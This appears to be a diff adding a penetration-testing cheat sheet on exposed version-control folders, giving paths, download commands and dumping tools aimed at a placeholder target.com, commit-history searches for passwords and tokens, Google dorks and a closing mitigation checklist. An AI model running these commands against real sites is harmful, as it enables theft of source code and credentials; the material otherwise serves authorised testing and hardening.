@@ -1,0 +1,262 @@
+# Insecure Source Code Management
+
+## ========================================
+## GIT EXPOSURE
+## ========================================
+
+# Common Git paths
+/.git/
+/.git/config
+/.git/HEAD
+/.git/index
+/.git/logs/
+/.git/logs/HEAD
+/.gitignore
+
+# Git files
+/.git/description
+/.git/hooks/
+/.git/info/
+/.git/objects/
+/.git/refs/
+
+## ========================================
+## GIT EXPLOITATION
+## ========================================
+
+# Check for .git directory
+curl http://target.com/.git/HEAD
+
+# Download .git folder
+wget -r http://target.com/.git/
+
+# Reconstruct source
+cd .git
+git checkout .
+git log
+
+## ========================================
+## SVN EXPOSURE
+## ========================================
+
+# SVN paths
+/.svn/
+/.svn/entries
+/.svn/wc.db
+/.svn/all-wcprops
+/.svn/text-base/
+
+# Download SVN
+wget -r http://target.com/.svn/
+
+## ========================================
+## MERCURIAL (.hg)
+## ========================================
+
+/.hg/
+/.hg/store
+/.hg/requires
+
+## ========================================
+## CVS
+## ========================================
+
+/CVS/
+/CVS/Entries
+/CVS/Root
+
+## ========================================
+## BAZAAR
+## ========================================
+
+/.bzr/
+/.bzrignore
+
+## ========================================
+## TOOLS
+## ========================================
+
+# git-dumper
+python3 git-dumper.py http://target.com/.git/ output/
+
+# GitTools
+./gitdumper.sh http://target.com/.git/ output/
+./extractor.sh output/ extracted/
+
+# dvcs-ripper
+perl rip-git.pl -v -u http://target.com/.git/
+
+# git-hack
+python githack.py http://target.com/.git/
+
+## ========================================
+## EXPLOITATION WORKFLOW
+## ========================================
+
+# 1. Detect exposed .git
+curl http://target.com/.git/HEAD
+
+# 2. Download repository
+git-dumper http://target.com/.git/ dump/
+
+# 3. Extract source code
+cd dump
+git checkout .
+
+# 4. Analyze code
+# Look for:
+- Hardcoded credentials
+- API keys
+- Sensitive comments
+- Vulnerabilities
+
+# 5. Check commit history
+git log --all --full-history
+git show <commit-hash>
+
+## ========================================
+## INFORMATION IN .GIT
+## ========================================
+
+# Config file
+/.git/config
+# May contain: username, email, remote URLs
+
+# Commit history
+git log --all
+# May reveal: developer names, internal paths
+
+# Source code
+# Complete application source
+
+# Credentials in commits
+git log -p | grep -i password
+git log -p | grep -i api_key
+
+## ========================================
+## SEARCHING COMMITS
+## ========================================
+
+# Search for secrets
+git log -p | grep -i "password"
+git log -p | grep -i "api_key"
+git log -p | grep -i "secret"
+git log -p | grep -i "token"
+
+# Search all branches
+git log --all --full-history --source -- "*password*"
+
+# Search deleted files
+git log --all --full-history --diff-filter=D
+
+## ========================================
+## SENSITIVE FILES
+## ========================================
+
+# Common sensitive files in repos:
+.env
+config.php
+database.yml
+secrets.yml
+credentials.json
+id_rsa
+id_rsa.pub
+.aws/credentials
+.ssh/
+
+## ========================================
+## AUTOMATED SCANNING
+## ========================================
+
+# TruffleHog
+trufflehog git http://target.com/.git/
+
+# GitLeaks
+gitleaks detect --source ./dump/
+
+# Repo-supervisor
+repo-supervisor --url http://target.com/.git/
+
+## ========================================
+## OTHER VCS EXPOSURES
+## ========================================
+
+# Bitbucket
+/.bitbucket/
+
+# GitLab CI
+/.gitlab-ci.yml
+
+# GitHub
+/.github/
+
+## ========================================
+## BACKUP FILES
+## ========================================
+
+# Common backup exposures
+/backup/
+/backup.zip
+/backup.tar.gz
+/site-backup.zip
+/db-backup.sql
+/dump.sql
+
+## ========================================
+## SOURCE CODE ARCHIVES
+## ========================================
+
+/source.zip
+/source.tar.gz
+/src.zip
+/code.zip
+/website.zip
+
+## ========================================
+## IDE/EDITOR FILES
+## ========================================
+
+/.vscode/
+/.idea/
+/.vs/
+/.project
+/.classpath
+/.settings/
+
+## ========================================
+## TESTING CHECKLIST
+## ========================================
+
+1. Check for /.git/
+2. Check for /.svn/
+3. Check for /.hg/
+4. Check for backup files
+5. Try to download repository
+6. Extract source code
+7. Search for secrets
+8. Analyze commit history
+9. Check for sensitive files
+10. Review configuration
+
+## ========================================
+## COMMON DORKS
+## ========================================
+
+# Google Dorks
+inurl:/.git
+inurl:/.svn
+intitle:"Index of /.git"
+filetype:git
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Verify:
+- .git directory not accessible
+- .svn directory not accessible
+- No backup files exposed
+- No source archives exposed
+- Proper .gitignore configured
+- Secrets not in repository
+- Regular secret scanning
